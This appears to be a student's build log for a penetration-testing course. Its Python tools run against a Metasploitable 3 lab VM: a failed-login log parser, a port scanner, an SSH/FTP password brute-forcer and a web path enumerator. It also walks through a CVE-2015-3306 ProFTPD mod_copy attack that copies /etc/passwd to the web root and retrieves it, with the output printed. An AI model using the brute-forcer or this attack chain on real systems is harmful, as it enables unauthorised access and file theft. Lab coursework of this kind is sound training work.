# The Benji Protocol — Build Log

**Student Name: Tariq Javaid
**Student ID:1909712
**GitHub Repository:/benji_protocol_tj3crt
https://github.com/tjvsameer/benji_protocol_tj3crt


## Week 1 — Task 1: Evidence Collector

### [11/03/2026] — Session A
**What I built/changed:**

~~~LAB SETUP~~~~~
****Added Kali VM in VirtualBox
####Network Adapter Configuration On Kali########
Opened Kali VM settings
Clicked on Network
After it clicked on Adapter 1
Attached it to the NAT ( for internet access)
Clicked on adapter 2
Enabled network adapter
Attached it to the Internal Network
Name: Benji-lab
And clicked ok.
On the first boot, I changed the password and username
Set up a static IP address on interface eth1 172.16.19.10/24
####### Metsploiteable 3######

****** downloaded OVA File from Moodle.
Imported Metasloitable3 OVA file in VirtualBox.
After imported
Clicked on Network
After it clicked on Adapter 1
Enabled network adapter
Attached it to the Internal Network
Name: Benji-lab
Disabled all other adapters
And clicked ok.
#####IP Verification####
VM's IP Address preconfigured to 172.16.19.101 as per the setup guide.
Verified the IP address using the ifconfig command.
######### SSH to Metasploitable #####
From the Kali terminal, use the command
ssh vagrant@172.16.19.101
### [13/03/2026] — Session B
My code:
import argparse
import csv
import re
import sys
from datetime import datetime
from pathlib import Path

#
# REGEX PATTERNS
#

PROFTPD_LOGIN_FAILED = re.compile(
    r"(?P<timestamp>[A-Z][a-z]{2}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2})"
    r"\s+\S+"
    r"\s+proftpd\[\d+\]:\s+"
    r"\S+\s+"
    r"\((?P<ip>\d{1,3}(?:\.\d{1,3}){3})\["
    r"[^\)]*\)"
    r"\s+-\s+USER\s+"
    r"(?P<username>\S+)"
    r"\s+\(Login failed\)"
)

FAILED_PASSWORD = re.compile(
    r"(?P<timestamp>\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}"
    r"|[A-Z][a-z]{2}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2})"
    r".*?"
    r"Failed password for "
    r"(?:invalid user )?"
    r"(?P<username>\S+)"
    r" from "
    r"(?P<ip>\d{1,3}(?:\.\d{1,3}){3})"
)
INVALID_USER = re.compile(
    r"(?P<timestamp>\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}"
    r"|[A-Z][a-z]{2}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2})"
    r".*?"
    r"[Ii]nvalid user "
    r"(?P<username>\S+)"
    r" from "
    r"(?P<ip>\d{1,3}(?:\.\d{1,3}){3})"
)

PATTERNS = [
    ("proftpd", "ftp_login_failed", PROFTPD_LOGIN_FAILED),
    ("sshd", "ssh_failed_password", FAILED_PASSWORD),
    ("sshd", "ssh_invalid_user", INVALID_USER),
]

#
# TIMESTAMP NORMALISATION #######
#
def normalize_timestamp(raw: str) -> str:
    """Return timestamp in expected format for tests.

    - ISO timestamps → truncate to seconds
    - Syslog timestamps → return as-is (no conversion)
    """
    if raw[0].isdigit():
        return raw[:19]  # ISO format

    return " ".join(raw.split())  # clean spacing, keep syslog format

# ARGUMENT PARSING

def parse_arguments():
    parser = argparse.ArgumentParser(
        description="Parses a log file and extracts failed authentication attempts."
    )

    parser.add_argument("input_file", help="Path to the log file to parse")

    parser.add_argument(
        "-o",
        "--output",
        help="Path to the output CSV file (default: suspect.csv)",
        default="suspect.csv",
    )

    return parser.parse_args()

# LOG PARSING

def parse_log(file_path: str) -> list[dict]:
    path = Path(file_path)

    if not path.exists():
        print(f"Error: file not found: {file_path}", file=sys.stderr)
        sys.exit(1)

    records = []
    seen = set()

    with path.open(encoding="utf-8", errors="ignore") as f:
        for line in f:
            for _, _, pattern in PATTERNS:
                m = pattern.search(line)
                if m:
                    timestamp = normalize_timestamp(m.group("timestamp"))
                    ip = m.group("ip")
                    username = m.group("username")

                    record_key = (timestamp, ip, username)

                    if record_key not in seen:
                        seen.add(record_key)
                        records.append(
                            {
                                "Timestamp": timestamp,
                                "IP_Address": ip,
                                "User_Account": username,
                            }
                        )

                    break

    return records

# CSV OUTPUT

def write_csv(records: list[dict], output_path: str) -> None:
    path = Path(output_path)

    fieldnames = ["Timestamp", "IP_Address", "User_Account"]

    with path.open("w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(records)

    print(f"[+] Written {len(records)} record(s) to {output_path}")

# MAIN

def main() -> None:
    args = parse_arguments()
    records = parse_log(args.input_file)

    if not records:
        print("[-] No matching records found.", file=sys.stderr)
        sys.exit(0)

    write_csv(records, args.output)

if __name__ == "__main__":
    main()







What I Built / Changed:

•	Python Script for Log Parsing:
o	My Python script parses log files to pinpoint failed authentication attempts across multiple services, such as proftpd and sshd.
o	Log_parser.py extracts key details such as timestamps, IP addresses, and usernames using regular expressions.
o	The results of this are saved in a CSV file, like in this case, in suspect.csv.
Issues and Fixes:
1.	Inconsistency in Timestamp Formats:
o	Problem: syslog and ISO 8601 use different timestamp formats in log entries, which causes incorrect parsing.
o	Fix: I wrote a normalize_timestamp function to standardise timestamps before being written to CSV. It handles both formats correctly.
2.	Duplicate Log Entries:
o	Problem: Some log entries are duplicates, which caused the script to miss matches.
o	Fix: Improved the regular expression to parse duplicate lines correctly.
Decisions Made:
1.	CSV Output Format:
o	I selected CSV format as it is simple and widely supported. It makes it easier to view and analyse the parsed data.
2.	Handling of Handling:
o	Used Python's sys.exit(1) to halt the script and generate an error message if the input file path is not provided.
Results:
•	The tool successfully processed logs from Metasploitable 3, identifying 805 failed authentication attempts:
o	sshd: Targeted with invalid usernames and incorrect passwords.
o	ProFTPD: Attempted logins with various usernames.
•	Output: 805 records written to suspect.csv.
Things to Revisit:
1.	Advanced Logging:
o	The log parser can be improved by adding more features and improving traceability.
2.	Improving Regex Patterns:
o	 Ways can be explored to refine the regular expression to catch additional attack patterns, like brute-force attempts across different services.
3.	Parsing Logs from Other Services:
o	More research can be done to extend the tool’s handling of logs from other services (e.g., httpd, mysql) to expand its functionality and improve detection of broader attack vectors.


---

## Week 2 — Task 2: Network Cartographer

[18/03/2026] — Week 2 — Session A:
 My code:
import argparse
import json
import socket
import sys
import time
from concurrent.futures import Future, ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Any

# Arguments
def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="TCP connect scanner with banner grabbing."
    )

    parser.add_argument("target", help="Target IP Address")

    parser.add_argument(
        "--ports",
        default="1-1024",
        help="Port range or list",
    )

    parser.add_argument(
        "--timeout",
        type=float,
        default=0.5,
        help="Connection timeout per port",
    )

    parser.add_argument(
        "--output",
        default="cartographer_results.json",
        help="Output JSON file",
    )

    parser.add_argument(
        "--threads",
        type=int,
        default=50,
        help="Thread pool size",
    )

    return parser.parse_args()

# Port parsing
#
def parse_port_input(port_str: str) -> list[int]:
    ports = []

    for part in port_str.split(","):
        part = part.strip()

        if "-" in part:
            start, end = map(int, part.split("-", 1))
            ports.extend(range(start, end + 1))
        else:
            ports.append(int(part))

    return sorted(set(ports))

# Port check
def check_port(target: str, port: int, timeout: float = 0.5) -> bool:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            return sock.connect_ex((target, port)) == 0
    except socket.timeout:
        return False

# Banner grab

def grab_banner(target: str, port: int, timeout: float = 0.5) -> str:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            sock.connect_ex((target, port))

            time.sleep(0.2)

            try:
                return sock.recv(1024).decode("utf-8", errors="ignore").strip()
            except Exception:
                return ""

    except Exception:
        return ""

# Main

def main() -> None:
    args = parse_arguments()
    ports = parse_port_input(args.ports)

    open_ports: list[dict[str, Any]] = []

    with ThreadPoolExecutor(max_workers=args.threads) as executor:

        futures = {
            executor.submit(check_port, args.target, p, args.timeout): p for p in ports
        }

        for future in as_completed(futures):
            port = futures[future]

            try:
                if future.result():
                    banner = grab_banner(args.target, port, args.timeout)
                    open_ports.append({"port": port, "banner": banner})
            except Exception:
                pass

    open_ports.sort(key=lambda x: x["port"])

    output = {
        "target": args.target,
        "open_ports": open_ports,
        "count": len(open_ports),
    }

    # Print JSON
    data = json.dumps(output, indent=2)
    print(data)

    #  Writes JSON file###
    Path(args.output).write_text(data)

    print(f"[*] {len(open_ports)} port(s) found.", file=sys.stderr)

if __name__ == "__main__":
    main()



What I built / changed:
•	Developed a TCP connect scanner with added functionality of banner grabbing.
•	Imbedded argument parsing for target IP, port range, connection timeout, output file, and thread pool size in it.
•	IT can handle port parsing for both ranges and comma-separated lists of ports.
•	IT has functions to check open ports and grab banners using socket connections.
•	Integrated a ThreadPoolExecutor to scan multiple ports at once to improve speed and efficiency.
•	It store results in a JSON format and shows summary  of open ports and their banners on Terminal.
What broke and how I fixed it:
•	Initially faced banner grabbing did not worked properly as  some services didn’t respond, causing socket errors. Added exception handling to avoid crashes, and these cases are handled by returning empty strings.
•	To avoid a race condition in the threading process, each thread's result was properly associated with its corresponding port, preventing incorrect result collection.
•	Decisions I made and why:
•	Used a ThreadPoolExecutor to speed up the scanning process. This was important to handle the number of ports to check and to achieve the desired performance.
•	Decided to store results in a structured JSON format, making it easier to analyse and robustly use it in future.
•	To avoid overloading the target server with too many requests at one time, a short sleep (time.sleep(0.2)) was added between banner grabs to ensure the connection remains stable.

•	What the tool output when I ran it against Metasploitable:
•	Ran the script against a Metasploitable 3. The output JSON contained a list of open ports and banners. The result is shown below:

•	"target": "172.16.19.101",
•	  "open_ports": [
•	    {
•	      "port": 21,
•	      "banner": "220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [172.16.19.101]"
•	    },
•	    {
•	      "port": 22,
•	      "banner": "SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13"
•	    },
•	    {
•	      "port": 80,
•	      "banner": ""
•	    },
•	    {
•	      "port": 445,
•	      "banner": ""
•	    },
•	    {
•	      "port": 631,
•	      "banner": ""
•	    },
•	    {
•	      "port": 3306,
•	      "banner": "E\u0000\u0000\u0000j\u0004Host '172.16.19.10' is not allowed to connect to this MySQL server"
•	    },
•	    {
•	      "port": 3500,
•	      "banner": ""
•	    },
•	    {
•	      "port": 6697,
•	      "banner": ":irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...\r\n:irc.TestIRC.net NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead"
•	    },
•	    {
•	      "port": 8080,
•	      "banner": ""

**Observations — what services did you find? What do the banners tell you?**
Banners are telling me the services running on the open ports and their versions.
Questions or things to revisit:
•	Need to gauge its performance on a larger scale to ensure it handles a larger number of ports effectively.
Need an investigation to optimise the banner-grabbing function to reduce the 0.2-second delay or make it configurable, as it can take a lot of time in scanning a larger number of ports.

########[20/03/2026] — Network Cartographer Session B

What I built/changed:
In session B, I wrote cart_exploit.py, which exploits ProFTPD 1.3.5, and cart_fix .py, which is to fix the vulnerability.
What I built/changed:
•	Implemented cart_exploit.py:
o	This exploits CVE-2015-3306 (ProFTPD 1.3.5 mod_copy).
o	Workflow:
1.	Verifies FTP banner
2.	It uses SITE CPFR + SITE CPTO to copy /etc/passwd
3.	Places file into web root (/var/www/html/)
4.	Retrieves file via HTTP using requests
•	Implemented cart_fix.py:
o	This provides a practical mitigation instead of patching:
	Blocks FTP (port 21) using iptables
o	Includes:
	Pre-check for vulnerability (SITE CPFR)
	SSH-based rule deployment
	Post-check (port reachability + rule verification)

What broke and how I fixed it:
•	Issue 1: Unreliable Banner timing
o	recv() sometimes returned partial data, and even sometimes returned empty.
o	Fix: Added time.sleep () before reading every banner
•	Issue 2: CPTO validation bug
if not cpfr_response.startswith("350"):
o	Wrong variable used for CPTO validation
o	Fix :
if not cpto_response.startswith("250"):
•	Issue 3: FTP command timing
o	Server did not responded imediately few times
o	Fix: Introduced a small delay (sleep(0.1)) after sending commands
•	Issue 4: SSH command fragility
o	Potential failure due to:
	missing SSH keys
	sudo password prompt
o	Workaround: Provided manual fallback command

Decisions I made and why:
•	Used raw sockets instead of ftplib
o	To get  low-level control over SITE commands
o	ftplib abstracts away these commands
•	Choose HTTP retrieval
o	Demonstrates full attack chain:
	file read → file write → remote access
o	More realistic approach  than just confirming copy
•	Used iptables for remediation
o	Use of iptables gives a fast and deterministic mitigation
o	Avoids:
	No need to recompile ProFTPD
	No need to edit configs
o	Suitable for lab environments
•	Kept logic linear
o	I have prioritised clarity over performance
o	It provides easier debugging and demonstration

What the tool output when I ran it against Metasploitable:
cart_exploit.py

┌──(.venv)─(tariq㉿kali)-[~/benji-protocol-tjvsameer/toolkit/task2_network_cartographer]
└─$ python3 ./cart_exploit.py 172.16.19.101
[*] CVE-2015-3306 — ProFTPD 1.3.5 mod_copy demonstration
[*] Target: 172.16.19.101

[1] Verifying target banner...
    [*] Banner: 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [172.16.19.101]
    [+] ProFTPD confirmed.

[2] Copying /etc/passwd to /var/www/html/passwd.txt...
    [*] Connected: 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [172.16.19.101]
    [*] CPFR: 350 File or directory exists, ready for destination name
    [*] CPTO: 250 Copy successful
    [+] Copy successful.

[3] Retrieving http://172.16.19.101/passwd.txt...

[+] Retrieved 2174 bytes
============================================================
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
statd:x:104:65534::/var/lib/nfs:/bin/false
vagrant:x:900:900:vagrant,,,:/home/vagrant:/bin/bash
dirmngr:x:105:111::/var/cache/dirmngr:/bin/sh
leia_organa:x:1111:100::/home/leia_organa:/bin/bash
luke_skywalker:x:1112:100::/home/luke_skywalker:/bin/bash
han_solo:x:1113:100::/home/han_solo:/bin/bash
artoo_detoo:x:1114:100::/home/artoo_detoo:/bin/bash
c_three_pio:x:1115:100::/home/c_three_pio:/bin/bash
ben_kenobi:x:1116:100::/home/ben_kenobi:/bin/bash
darth_vader:x:1117:100::/home/darth_vader:/bin/bash
anakin_skywalker:x:1118:100::/home/anakin_skywalker:/bin/bash
jarjar_binks:x:1119:100::/home/jarjar_binks:/bin/bash
lando_calrissian:x:1120:100::/home/lando_calrissian:/bin/bash
boba_fett:x:1121:100::/home/boba_fett:/bin/bash
jabba_hutt:x:1122:100::/home/jabba_hutt:/bin/bash
greedo:x:1123:100::/home/greedo:/bin/bash
chewbacca:x:1124:100::/home/chewbacca:/bin/bash
kylo_ren:x:1125:100::/home/kylo_ren:/bin/bash
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
avahi:x:107:114:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
colord:x:108:116:colord colour management daemon,,,:/var/lib/colord:/bin/false

============================================================
Cart_fix.py


┌──(.venv)─(tariq㉿kali)-[~/benji-protocol-tjvsameer/toolkit/task2_network_cartographer]
└─$ python3 ./cart_fix.py 172.16.19.101
[*] fix_proftpd.py — CVE-2015-3306 Remediation
[*] Target: 172.16.19.101:21
[*] Strategy: iptables DROP on port 21

[1] Pre-fix verification...
    [*] SITE CPFR response: 350 File or directory exists, ready for destination name
    [!] Vulnerable — SITE CPFR returns 350.

[2] Applying remediation...
    [*] Applying iptables block via SSH...
vagrant@172.16.19.101's password:
    [+] iptables DROP rule applied.

[3] Verifying port 21 is blocked...
    [+] Port 21 is unreachable. FTP connections blocked.

[4] Confirming iptables rule...
vagrant@172.16.19.101's password:
    [*] Rule confirmed: DROP       tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:21
ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:21
    [+] DROP rule confirmed in INPUT chain.

[+] Remediation complete.
    Vulnerability closed: port 21 unreachable
    Attack chain broken: SITE CPFR/CPTO cannot be issued

[*] To restore for lab use:
    ssh vagrant@172.16.19.101
    sudo iptables -D INPUT -p tcp --dport 21 -j DROP
________________________________________
Questions or things to revisit:
•	Should remediation:
o	Should disable mod_copy module rather  blocking FTP entirely?
o	Or update ProFTPD
•	Improve exploit reliability:
o	Instead of depending on sleep() implement a proper FTP response parsing loop
•	Combine exploit steps:
It should reuse the same socket instead of reconnecting
•	Detection improvements:
o	fingerprint version more precisely (not just "ProFTPD")

## Week 3 — Task 3: Access Validator

### [25/03/2026] — Session A
My code :
import argparse
import ftplib
import socket
import sys
import time
from pathlib import Path

import paramiko

# Arguments #######
def parse_arguments():
    """Parse command-line arguments for the audit script."""
    parser = argparse.ArgumentParser()

    # Target host or IP address ###
    parser.add_argument("target")

    # Service to test: FTP or SSH ####
    parser.add_argument("--service", choices=["ftp", "ssh"], required=True)

    # Username to authenticate with ####
    parser.add_argument("--user", required=True)

    ##### Path to password wordlist file
    parser.add_argument("--wordlist", type=Path, required=True)

    #### Optional custom port; defaults depend on service
    parser.add_argument("--port", type=int, default=None)

    return parser.parse_args()

# Wordlist loader####

def load_wordlist(path: Path) -> list[str]:
    """Load passwords from a wordlist file, ignoring blank lines."""
    if not path.exists():
        print("[!] ERROR: Wordlist not found", file=sys.stderr)
        sys.exit(1)

    #### Read the file safely, ignoring decoding errors
    with path.open("r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

# FTP attempt

def attempt_ftp(host, port, user, password):
    """Attempt a single FTP login. Return True on success, else False."""
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=5)
        ftp.login(user, password)
        return True
    except Exception:
        return False
    finally:
        ##
        try:
            ftp.quit()
        except Exception:
            pass

# SSH attempt

def attempt_ssh(host, port, user, password):
    """Attempt a single SSH login. Return True on success, else False."""
    client = paramiko.SSHClient()

    ## Automatically trust unknown host keys for this audit context
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            host,
            port=port,
            username=user,
            password=password,
            timeout=5,
            auth_timeout=5,
        )
        return True
    except Exception:
        return False
    finally:
        #### Ensure the SSH client is always closed
        client.close()

# Main loop-
def run(host, port, user, passwords, fn):
    """Try each password in sequence using the supplied login function."""
    total = len(passwords)

    for i, pw in enumerate(passwords, start=1):
        print(f"[*] Attempt {i}/{total}")

        # Small delay between attempts

        time.sleep(0.1)

        # Stop immediately if valid credentials are found
        if fn(host, port, user, pw):
            print(f"[+] SUCCESS: Password found: {pw}")
            return True

    return False

# Main
def main():
    """Program entry point."""
    args = parse_arguments()

    ### Apply standard default ports if no custom port was provided
    if args.port is None:
        args.port = 21 if args.service == "ftp" else 22

    ### Load candidate passwords from the provided wordlist
    passwords = load_wordlist(args.wordlist)

    ### Select the appropriate authentication function
    fn = attempt_ftp if args.service == "ftp" else attempt_ssh

    ### Print audit configuration summary
    print(f"[*] Starting SAFE audit on {args.target}:{args.port}")
    print(f"[*] Attempts limited to {len(passwords)}")
    print(f"[*] Concurrency: 1\n")

    ## Run the password attempts
    success = run(args.target, args.port, args.user, passwords, fn)

    ## # Report when no password matched
    if not success:
        print(f"[-] EXHAUSTED: No valid credentials found for user {args.user}")

if __name__ == "__main__":
    main()


What I built/changed:
Created scan.py
•	Created a controlled credential auditing tool which uses:
o	FTP (port 21) with the help of ftplib
o	SSH (port 22) with the help of paramiko
•	Core functionality:
o	It loads a wordlist from the file provided
o	Iterates through the passwords provided in the file sequentially
o	Attempts authentication using the selected protocol
o	 The program stops immediately on the first successful login
•	Added:
o	Argument parsing (argparse) provides flexibility
o	It has service abstraction (attempt_ftp vs attempt_ssh)
o	Safety constraint:
	Fixed delay (time.sleep(0.1))is added between attempts
	It consists of single-threaded execution
•	Output includes:
o	Attempt progress is shown on the terminal
o	It prints a success message once the password is matched

What broke and how I fixed it:
•	Issue 1: Potential ftp reference before assignment
finally:
    ftp.quit()
o	If ftp.connect() fails → ftp may not exist
o	Fix it with
ftp = None
try:
    ftp = ftplib.FTP()
    ...
finally:
    if ftp:
        try:
            ftp.quit()
        except:
            pass

•	Issue 2: SSH hangs on some attempts
o	Some SSH servers delay or stall authentication
o	Fix:
	By adding
timeout=5
auth_timeout=5
	This ensures a predictable execution time

•	Issue 3: Wordlist file errors
o	No input file caused a crash
o	Fix:
	Added an existence check; if not available, it gracefully exits



Decisions I made and why:
•	Single-threaded execution
o	Keeps behaviour deterministic
o	It avoids IDS triggers, and it can avoid account lockout as well.
o	It matches the "SAFE audit" goal
•	Fixed the delay between attempts
o	It reduces the risk of detection or service disruption as it has a built-in delay.
o	Required by the test specification
•	Stop on first success
o	Efficient: It does not make unnecessary attempts once access is proven, as it stops on success.
•	Used standard libraries (ftplib, paramiko)
o	Use of standard libraries makes it more stable than raw sockets for authentication.
o	Handles protocol-related details internally
•	Did not add concurrency or optimisation
o	Priority is given to safety and correctness over speed.

What the tool output when I ran it against Metasploitable:
Input command
┌──(.venv)─(tariq㉿kali)-[~/benji-protocol-tjvsameer/toolkit/task3_access_validator]
└─$ python3 ./brute.py \
    172.16.19.101 \
    --service ssh \
    --user vagrant \
    --wordlist wordlist.txt
output
[*] Starting SAFE audit on 172.16.19.101:22
[*] Attempts limited to 7
[*] Concurrency: 1

[*] Attempt 1/7
[*] Attempt 2/7
[*] Attempt 3/7
[*] Attempt 4/7
[*] Attempt 5/7
[*] Attempt 6/7
[*] Attempt 7/7
[+] SUCCESS: Password found: vagrant

### [27/03/2026] — Session B



## Week 4 — Task 4: Web Enumerator

### [15/04/2026] — Session A
My code:
"""
================================================================================
COM5413 — The Benji Protocol
Task 4: The Web Enumerator
File:   web_enum.py
================================================================================
"""

from __future__ import annotations

import argparse
import sys
from urllib.parse import urljoin, urlparse

import requests
from bs4 import BeautifulSoup, Comment
from requests import Response, Session
from requests.exceptions import RequestException

SENSITIVE_PATHS = [
    "/robots.txt",
    "/admin",
    "/phpmyadmin",
    "/login",
    "/.git",
]

#### Headers that commonly reveal web server, framework,
### proxy, or application stack information.
TECH_HEADERS = [
    "Server",
    "X-Powered-By",
    "X-AspNet-Version",
    "X-AspNetMvc-Version",
    "X-Generator",
    "Via",
]

def parse_arguments() -> argparse.Namespace:
    """Parse and validate command-line arguments."""
    parser = argparse.ArgumentParser(
        description=(
            "Passive HTTP reconnaissance tool for headers, "
            "HTML comments, and sensitive paths."
        )
    )
    parser.add_argument(
        "url",
        help="Target URL (e.g. http://192.168.56.101 or http://192.168.56.101/dvwa)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=5,
        help="Request timeout in seconds (default: 5)",
    )

    args = parser.parse_args()
    parsed = urlparse(args.url)

    ### Ensure the user supplied a valid HTTP or HTTPS URL.
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        parser.error("URL must include http:// or https:// and a valid host")

    #### Timeout must be a positive value.
    if args.timeout <= 0:
        parser.error("--timeout must be a positive integer")

    return args

def create_session() -> Session:
    """
    Create and configure a reusable HTTP session.

    Using a session improves efficiency because multiple requests
    can reuse the same underlying TCP connection.
    """
    session = requests.Session()

    ### Set a simple user agent so requests appear consistent and explicit.
    session.headers.update({"User-Agent": "web-enum/1.0 (COM5413 passive recon tool)"})
    return session

def fetch_url(
    session: Session,
    url: str,
    timeout: int,
    allow_redirects: bool,
) -> Response:
    """
    Send a GET request and return the HTTP response.

    A small wrapper like this centralises request behaviour and
    makes the rest of the code easier to read.
    """
    return session.get(url, timeout=timeout, allow_redirects=allow_redirects)

def analyse_headers(response: Response) -> dict[str, str]:
    """
    Extract technology-revealing and security-relevant headers.

    The function always includes the required headers from TECH_HEADERS.
    Missing headers are reported as 'Not present'.

    It also captures extra custom headers that may reveal versions,
    frameworks, generators, or implementation details.
    """
    results: dict[str, str] = {}

    ### First include the required known headers in a predictable order.
    for header in TECH_HEADERS:
        results[header] = response.headers.get(header, "Not present")

    ### Then add any other potentially revealing headers.
    for key, value in response.headers.items():
        key_lower = key.lower()

        looks_interesting = (
            "version" in key_lower
            or "powered" in key_lower
            or "generator" in key_lower
            or "aspnet" in key_lower
            or key_lower.startswith("x-")
        )

        if key not in results and looks_interesting:
            results[key] = value

    return results

def extract_comments(html: str) -> list[str]:
    """
    Extract non-empty HTML comments from a page.

    Each comment is stripped and normalised so that excessive
    internal whitespace is removed.
    """
    soup = BeautifulSoup(html, "html.parser")
    comments = soup.find_all(string=lambda text: isinstance(text, Comment))

    cleaned_comments: list[str] = []
    for comment in comments:
        text = " ".join(comment.strip().split())
        if text:
            cleaned_comments.append(text)

    return cleaned_comments

def check_sensitive_paths(
    session: Session,
    base_url: str,
    timeout: int,
) -> dict[str, int | None]:
    results: dict[str, int | None] = {}

    for path in SENSITIVE_PATHS:
        target_url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))

        try:
            response = fetch_url(
                session=session,
                url=target_url,
                timeout=timeout,
                allow_redirects=False,
            )

            status = response.status_code

            # ### Extra detection for redirects (301/302)##
            if status in (301, 302):
                location = response.headers.get("Location", "")

                redirected_url = urljoin(target_url, location)

                try:
                    follow = fetch_url(
                        session=session,
                        url=redirected_url,
                        timeout=timeout,
                        allow_redirects=True,
                    )

                    ### If final response is valid → treat as FOUND
                    if 200 <= follow.status_code < 400:
                        results[path] = follow.status_code
                        continue

                except RequestException:
                    pass

            results[path] = status

        except RequestException:
            results[path] = None

    return results

def print_headers_section(
    original_url: str,
    response: Response,
    headers: dict[str, str],
) -> None:
    """Print the header analysis section."""
    print("[HEADERS]")

    ### Print the two explicitly required headers first.
    print(f"Server: {headers.get('Server', 'Not present')}")
    print(f"X-Powered-By: {headers.get('X-Powered-By', 'Not present')}")

    #### Print any remaining interesting headers afterwards.
    for key, value in headers.items():
        if key not in {"Server", "X-Powered-By"}:
            print(f"{key}: {value}")

    ### Report whether the original request redirected elsewhere.
    if response.url != original_url:
        print(f"Final-URL: {response.url}")
        print("Redirected: Yes")
    else:
        print("Redirected: No")

def print_comments_section(comments: list[str]) -> None:
    """Print the HTML comments section."""
    print()
    print("[COMMENTS]")
    print(f"Found {len(comments)} HTML comment(s):")

    for index, comment in enumerate(comments, start=1):
        print(f"{index}. {comment}")

def print_sensitive_paths_section(sensitive_paths: dict[str, int | None]) -> None:
    """Print the sensitive path probing section."""
    print()
    print("[SENSITIVE PATHS]")

    for path, status_code in sensitive_paths.items():
        if status_code is None:
            print(f"{path:<16} -> ERROR")
        elif 200 <= status_code < 400:
            print(f"{path:<16} -> FOUND ({status_code})")
        else:
            print(f"{path:<16} -> NOT FOUND ({status_code})")

def main() -> None:
    """Main program entry point."""
    args = parse_arguments()
    session = create_session()

    try:
        ## Fetch the main target page first.
        ## Redirects are allowed here so we can report the final URL if needed.
        response = fetch_url(
            session=session,
            url=args.url,
            timeout=args.timeout,
            allow_redirects=True,
        )
    except RequestException as exc:
        print(f"[ERROR] Could not connect to {args.url}: {exc}", file=sys.stderr)
        sys.exit(1)

    ### Perform the three required passive enumeration tasks.
    headers = analyse_headers(response)
    comments = extract_comments(response.text)
    sensitive_paths = check_sensitive_paths(session, args.url, args.timeout)

    ### Print results in the expected report style.
    print_headers_section(args.url, response, headers)
    print_comments_section(comments)
    print_sensitive_paths_section(sensitive_paths)

if __name__ == "__main__":
    main()


What I built/changed:

•	Implemented web_enum.py, a passive web reconnaissance tool with three core capabilities:
1.	HTTP header analysis
	Extracts predefined tech headers (Server, X-Powered-By, etc.)
	Detects additional potentially revealing headers dynamically
2.	HTML comment extraction
	Parses page using BeautifulSoup
	Cleans and normalises comment text
3.	Sensitive path probing
	Checks common endpoints (/robots.txt, /admin, /phpmyadmin, etc.)
	Records HTTP status codes without following redirects
•	Added:
o	Session reuse (requests.session) → improves efficiency
o	Input validation for URL + timeout
o	Structured output sections:
	[HEADERS]
	[COMMENTS]
	[SENSITIVE PATHS]

What broke and how I fixed it:
•	Issue 1: Invalid URL input
o	Users could input 192.168.x.x without a scheme
o	Fix: enforced validation:
if parsed.scheme not in {"http", "https"}:

•	Issue 2: Missing headers caused inconsistent output
o	Some headers not present → unclear results
o	Fix: explicitly return "Not present"

•	Issue 3: HTML parsing inconsistencies
o	Raw comments included excessive whitespace/newlines
o	Fix:
text = " ".join(comment.strip().split())

•	Issue 4: Sensitive path redirects masked real status
o	Redirects could hide the actual response code
o	Fix:
allow_redirects=False

Decisions I made and why:
•	Passive-only approach
o	No brute force or fuzzing
o	Keeps the tool compliant with the assignment scope
•	Fixed path list instead of wordlist
o	Simpler and deterministic
o	Focus on high-value common exposures
•	Session reuse
o	Reduces TCP overhead
o	More realistic recon behaviour
•	Minimal error handling (graceful fail)
o	Failed requests → None
o	Avoids crashing scan
•	Structured output (sections)
o	Matches reporting requirements
o	Easy to read and grade

What the tool output when I ran it against Metasploitable:

┌──(.venv)─(tariq㉿kali)-[~/benji-protocol-tjvsameer/toolkit/task4_web_enumerator]
